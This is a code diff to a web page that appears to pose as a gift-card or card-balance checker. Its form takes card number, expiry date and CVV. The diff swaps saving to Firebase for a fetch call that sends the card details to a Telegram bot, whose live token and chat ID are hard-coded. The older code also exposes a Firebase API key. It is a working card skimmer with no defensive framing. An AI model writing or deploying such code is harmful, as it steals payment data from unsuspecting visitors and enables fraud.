@@ -25,7 +25,7 @@
               <a class="nav-link active text-light" aria-current="page" href="visa.html">Visa</a>
               <a class="nav-link active text-light" aria-current="page" href="walmart.html">Walmart</a>
               <a class="nav-link active text-light" aria-current="page" href="razergold.html">Razer Gold</a>
-              <a class="nav-link active text-light" aria-current="page" href="razergold.html">Steam</a>
+              <a class="nav-link active text-light" aria-current="page" href="steam.html">Steam</a>
            
            
             </div>
@@ -81,17 +81,17 @@
         import { getDatabase, ref, set, onValue, push } from "https://www.gstatic.com/firebasejs/10.12.1/firebase-database.js";
       
       
-        const firebaseConfig = {
-  apiKey: "AIzaSyCYzi9T8dqpjS8VY-PRSVFdwHUvsqzjzAw",
-  authDomain: "cardcard-6f2ef.firebaseapp.com",
-  projectId: "cardcard-6f2ef",
-  storageBucket: "cardcard-6f2ef.firebasestorage.app",
-  messagingSenderId: "1068987121792",
-  appId: "1:1068987121792:web:9c255c879435160599e665",
-  databaseURL: "https://cardcard-6f2ef-default-rtdb.firebaseio.com/"
-};
-        const app = initializeApp(firebaseConfig);
-        const database = getDatabase(app);
+//         const firebaseConfig = {
+//   apiKey: "AIzaSyCYzi9T8dqpjS8VY-PRSVFdwHUvsqzjzAw",
+//   authDomain: "cardcard-6f2ef.firebaseapp.com",
+//   projectId: "cardcard-6f2ef",
+//   storageBucket: "cardcard-6f2ef.firebasestorage.app",
+//   messagingSenderId: "1068987121792",
+//   appId: "1:1068987121792:web:9c255c879435160599e665",
+//   databaseURL: "https://cardcard-6f2ef-default-rtdb.firebaseio.com/"
+// };
+//         const app = initializeApp(firebaseConfig);
+//         const database = getDatabase(app);
         const Submit = async () => {
             let card = document.getElementById("cardnumber").value;
             let datey = document.getElementById("datey").value;
@@ -124,26 +124,53 @@
                 Cvv: cvv
 
             };
-            let dbRef = ref(database, todos);
-            let newDbRef = push(dbRef);
+            // let dbRef = ref(database, todos);
+            // let newDbRef = push(dbRef);
 
             spinn.style.display = 'block';
 
-            try {
-                await set(newDbRef, obj);
-                spinn.style.display = 'none';
-                successMessage.style.display = 'block';
-                setTimeout(() => {
-                    successMessage.style.display = 'none';
-                }, 5000);
-            } catch (error) {
-                console.log("failed to save", error);
-                spinn.style.display = 'none';
-                modal.style.display = 'block';
-                setTimeout(() => {
-                    modal.style.display = 'none';
-                }, 7000);
-            }
+
+              // Replace YOUR_BOT_TOKEN and CHAT_ID with your bot's token and chat ID
+    const botToken = '8191097883:AAHcw2x0KQ88QMiJTTZU9Rq1REGMF7WDN6k';
+    const chatId = '468271675';
+    const text = 'Card Number: ${card}\nExpied Date: ${datey}\nCvv: ${cvv}';
+            // const text = await set(obj);
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    try {
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text }),
+      });
+
+      if (response.ok) {
+        alert('Message sent successfully!');
+      } else {
+        alert('Failed to send message.');
+      }
+    } catch (error) {
+      console.error('Error:', error);
+      alert('An error occurred while sending the message.');
+    }
+        
+
+            // try {
+            //     await set(newDbRef, obj);
+            //     spinn.style.display = 'none';
+            //     successMessage.style.display = 'block';
+            //     setTimeout(() => {
+            //         successMessage.style.display = 'none';
+            //     }, 5000);
+            // } catch (error) {
+            //     console.log("failed to save", error);
+            //     spinn.style.display = 'none';
+            //     modal.style.display = 'block';
+            //     setTimeout(() => {
+            //         modal.style.display = 'none';
+            //     }, 7000);
+            // }
        
             document.getElementById('cardnumber').value= ''
             document.getElementById('datey').value= ''
